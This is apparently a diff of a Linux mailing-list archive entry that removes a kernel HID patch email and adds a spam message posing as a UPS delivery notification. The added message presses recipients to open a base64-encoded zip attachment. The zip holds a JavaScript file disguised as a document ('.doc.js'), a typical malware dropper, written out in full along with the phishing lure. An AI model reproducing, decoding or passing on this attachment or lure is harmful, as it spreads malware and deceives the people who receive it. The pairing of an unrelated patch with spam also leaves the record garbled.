@@ -1,59 +1,69 @@
-From: Dmitry Torokhov <dmitry.torokhov-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: [PATCH] HID: usbhid: fix "always poll" quirk
-Date: Wed, 12 Jul 2017 17:14:24 -0700
-Message-ID: <20170713001424.GA7990@dtor-ws>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-usb-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Content-Disposition: inline
-Sender: linux-usb-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Jiri Kosina <jikos-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Cc: Benjamin Tissoires <benjamin.tissoires-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Olof Johansson <olof-nZhT3qVonbNeoWH0uzbU5w@public.gmane.org>, linux-usb-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-input-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+From: CGI-Mailer <cgi-mailer@perfora.net>
+Subject: Delivery Notification, ID 7754052
+Date: Thu, 13 Jul 2017 07:04:44 -0400
+Message-ID: <0EjVQ8-1e2Df402B8-00pK5K@infong1415.perfora.net>
+Content-Type: multipart/mixed;
+        boundary="bound1_ab2fec1effa03a18942325f2ec3b96da"
+Content-Transfer-Encoding: 8bit
+Return-path: <linux-input-owner@vger.kernel.org>
+Received: from mout.perfora.net ([74.208.4.197]:64498 "EHLO mout.perfora.net"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1751046AbdGMLEp (ORCPT <rfc822;linux-input@vger.kernel.org>);
+        Thu, 13 Jul 2017 07:04:45 -0400
+Received: from infong1415.perfora.net ([74.208.114.126]) by mrelay.perfora.net
+ (mreueus003 [172.19.143.3]) with ESMTPA (Nemesis) id 0MUWvt-1d4Lk70GCx-00RE2A
+ for <linux-input@vger.kernel.org>; Thu, 13 Jul 2017 13:04:44 +0200
+Sender: linux-input-owner@vger.kernel.org
 List-Id: linux-input@vger.kernel.org
+To: linux-input@vger.kernel.org
 
-Even though the IO for devices with "always poll" quirk is already running,
-we still need to set HID_OPENED bit in usbhid->iofl so the interrupt
-handler does not ignore the data coming from the device.
+--bound1_ab2fec1effa03a18942325f2ec3b96da
+Content-Type: text/plain; charset=us-ascii
 
-Reported-by: Olof Johansson <olof-nZhT3qVonbNeoWH0uzbU5w@public.gmane.org>
-Tested-by: Olof Johansson <olof-nZhT3qVonbNeoWH0uzbU5w@public.gmane.org>
-Fixes: e399396a6b0 ("HID: usbhid: remove custom locking from usbhid_open...")
-Signed-off-by: Dmitry Torokhov <dmitry.torokhov-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
----
- drivers/hid/usbhid/hid-core.c | 16 ++++++++++------
- 1 file changed, 10 insertions(+), 6 deletions(-)
+Dear Customer,
 
-diff --git a/drivers/hid/usbhid/hid-core.c b/drivers/hid/usbhid/hid-core.c
-index 76013eb5cb7f..c008847e0b20 100644
---- a/drivers/hid/usbhid/hid-core.c
-+++ b/drivers/hid/usbhid/hid-core.c
-@@ -680,18 +680,21 @@ static int usbhid_open(struct hid_device *hid)
- 	struct usbhid_device *usbhid = hid->driver_data;
- 	int res;
- 
-+	set_bit(HID_OPENED, &usbhid->iofl);
-+
- 	if (hid->quirks & HID_QUIRK_ALWAYS_POLL)
- 		return 0;
- 
- 	res = usb_autopm_get_interface(usbhid->intf);
- 	/* the device must be awake to reliably request remote wakeup */
--	if (res < 0)
-+	if (res < 0) {
-+		clear_bit(HID_OPENED, &usbhid->iofl);
- 		return -EIO;
-+	}
- 
- 	usbhid->intf->needs_remote_wakeup = 1;
- 
- 	set_bit(HID_RESUME_RUNNING, &usbhid->iofl);
--	set_bit(HID_OPENED, &usbhid->iofl);
- 	set_bit(HID_IN_POLLING, &usbhid->iofl);
- 
- 	res = hid_start_in(hid);
-@@ -727,19 +730,20 @@ static void usbhid_close(struct hid_device *hid)
- {
- 	struct usbhid_device *usbhid = hid->driver_data;
- 
--	if (hid->quirks & HID_QUIRK_ALWAYS_POLL)
--		return;
+UPS courier was unable to contact you for your parcel delivery.
+
+Please check the attachment for details!
+
+Thank you for making business with us,
+ ,
+UPS Operation Manager.
+
+
+--bound1_ab2fec1effa03a18942325f2ec3b96da
+Content-Type: application/zip; name="UPS-Parcel-ID-7754052.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Parcel-ID-7754052.zip
+
+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
+AKMAAAAcBQAAAAA=
+
+
+--bound1_ab2fec1effa03a18942325f2ec3b96da--
+
